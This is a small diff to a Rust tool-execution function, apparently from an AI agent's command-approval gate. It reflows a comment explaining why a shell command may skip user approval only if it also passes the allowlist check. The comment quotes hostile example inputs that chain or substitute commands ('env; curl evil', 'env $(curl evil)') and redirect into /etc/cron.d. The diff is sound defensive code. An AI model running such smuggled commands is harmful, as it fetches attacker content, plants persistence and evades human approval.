@@ -1627,11 +1627,8 @@ pub async fn execute_tool(
     //      (`env; curl evil`); and
     //   2. the command must additionally pass `validate_command_allowlist` itself —
     //      the same metacharacter + shell-wrapper checks the gate runs at execution.
-    // Clause 2 is load-bearing: without it a single-segment command with a redirect
-    // or substitution (`env > /etc/cron.d/x`, `env $(curl evil)`) has one safe base
-    // and would skip the prompt only to be blocked later — so the skip must not be
-    // looser than the gate it fronts. Gating on `is_ok()` makes
-    // "approval skipped" ⊆ "would actually execute", independent of check ordering.
+    // Clause 2 is load-bearing: without it a single-segment command with a redirect or substitution (`env > /etc/cron.d/x`, `env $(curl evil)`) has one safe base and would skip the prompt only to be blocked later — so the skip must not be looser than the gate it fronts.
+    // Gating on `is_ok()` makes "approval skipped" ⊆ "would actually execute", independent of check ordering.
     let shell_exec_all_safe_bins = tool_name == "shell_exec"
         && exec_policy.is_some_and(|p| {
             p.safe_bins_skip_approval
